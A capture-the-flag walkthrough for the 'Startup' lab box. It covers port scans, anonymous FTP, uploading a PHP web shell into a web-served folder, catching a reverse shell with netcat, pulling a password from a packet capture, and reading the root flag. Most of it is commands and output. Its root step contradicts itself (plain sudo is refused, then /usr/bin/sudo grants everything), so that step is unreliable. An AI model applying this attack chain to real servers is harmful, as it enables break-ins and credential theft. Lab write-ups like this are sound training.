Difficult: Easy
---------------------------------------
Note: - Abuse traditional vulnerabilities via untraditional means.
      - Welcom to Spice Hut!
      - We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. 
      - To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. 
      - We ask that you perform a thorough penetration test and try to own root. Good luck!
---------------------------------------

Reconnaissance:
+ We perform to scan the ports and enumurate the directories:

```bash
	nmap -sV -vv -A -p- -T4 <IP>
	PORT   STATE SERVICE REASON         VERSION
	21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 10.11.101.46
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
	| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
	|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
	|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
	|   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
	80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Maintenance
	|_http-server-header: Apache/2.4.18 (Ubuntu)
```


```bash
	gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -xtxt -t64
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://<IP>/
	[+] Method:                  GET
	[+] Threads:                 64
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/files                (Status: 301) [Size: 310] [--> http://10.10.23.91/files/]
	/index.html           (Status: 200) [Size: 808]
	/server-status        (Status: 403) [Size: 276]
	Progress: 9228 / 9230 (99.98%)
	===============================================================
	Finished
	===============================================================
```

+ First login ftp with Anonymous:

```bash
	ftp <IP>
	220 (vsFTPd 3.0.3)
	Name (10.10.90.128:zicco): Anonymous
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls
	229 Entering Extended Passive Mode (|||49748|)
	150 Here comes the directory listing.
	drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
	-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
	-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
``` 

+ Now we check /files http -> We understand the /files mount with ftp so we can put the file into the web server through ftp.
+ So idea that we can put file shell php into the web server to catch the open listner.

```bash
	ftp> cd ftp
	250 Directory successfully changed.
	ftp> put phpShell.php 
	local: phpShell.php remote: phpShell.php
	229 Entering Extended Passive Mode (|||52240|)
	150 Ok to send data.
	100% |***********************************|  2591        2.07 MiB/s    00:00 ETA
	226 Transfer complete.
	2591 bytes sent in 00:00 (5.69 KiB/s)
``` 
+ In port 80/http, we access url: '<IP>/files/ftp/<file_shell>' and open listner with 'nc -lvnp <port>'

```bash
	Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
	 16:04:57 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	bash: cannot set terminal process group (1207): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@startup:/$ id
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
+ We try sudo -l and no tty. Now first we will upgrade interactive shell tty:

```bash
	python -c 'import pty;pty.spawn("/bin/bash")'
	Ctrl+Z
	stty raw -echo;fg
```
+ After interactive shell, let find more info
+ Look around we find the suspicious directory /incidents
+ Access /incidents we have file "suspicious.pcapng" -> With the format "pcapng", we can know that is the file capture by Wireshark.
+ Now we can move file to path /var/www/html/files/ftp which is not blocked by privilege server. And use Wireshark open to see file.
+ In Wireshark, we can export packet as Plain text that is easy to read the file. Open file, search word 'password' and go down to discover real password for user.
 - Or we can read directly file by cat command.
+ We had the real password: "c4ntg3t3n0ughsp1c3"
+ Login with user "lennie".
+ Go to /home/lennie, we have directory /scripts. List /scripts we have 2 files planner.sh and startup_list.txt, 2 files run with "root".
+ Now we need to read file planner.sh to see scripts inside but we cannot run nano. Exit the RCE and we use the password we found, Login again with SSH.
+ Login SSH with user "lennie" and run nano to read file 'planner.sh'

```bash
	$ nano planner.sh
		#!/bin/bash
		echo $LIST > /home/lennie/scripts/startup_list.txt
		/etc/print.sh
```
+ Read permission '/etc/print.sh' -> "-rwx------ 1 lennie lennie 45 Sep 21 14:03 /etc/print.sh" -> File run with permission user 'lennie':

```bash
	$ nano /etc/print.sh
		#!/bin/bash
		/bin/bash
	$ ./planner.sh
	./planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
	lennie@startup:~/scripts$ ls
	planner.sh  startup_list.txt
```

+ Try run "sudo -l":

```bash
	lennie@startup:~/scripts$ sudo -l
	sudo: unable to resolve host startup
	[sudo] password for lennie: 
	Sorry, user lennie may not run sudo on startup.
```
-> Can not run sudo with user 'lennie'
+ Now we can try find SUID binaries:

```bash
	lennie@startup:~/scripts$ find / -uid 0 -perm -4000 -type f 2>/dev/null
	/bin/mount
	/bin/fusermount
	/bin/umount
	/bin/ping6
	/bin/su
	/bin/ping
	/usr/bin/passwd
	/usr/bin/pkexec
	/usr/bin/sudo
	/usr/bin/newuidmap
	/usr/bin/chfn
	/usr/bin/newgrp
	/usr/bin/chsh
	/usr/bin/newgidmap
	/usr/bin/gpasswd
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/snapd/snap-confine
	/usr/lib/openssh/ssh-keysign
	/usr/lib/policykit-1/polkit-agent-helper-1
```
+ We guess can run sudo through /usr/bin/sudo
+ Now try again "/usr/bin/sudo -l":

```bash
	lennie@startup:~/scripts$ /usr/bin/sudo -l
	sudo: unable to resolve host startup
	[sudo] password for lennie: 
	Matching Defaults entries for lennie on startup:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User lennie may run the following commands on startup:
	    (ALL : ALL) ALL
```
-> It works!!!
+ Finally we will read flag root.txt

```bash
lennie@startup:~/scripts$ /usr/bin/sudo cat /root/root.txt
sudo: unable to resolve host startup
THM{f963aaa6a430f210222158ae15c3d76d}
```

END~~~!!!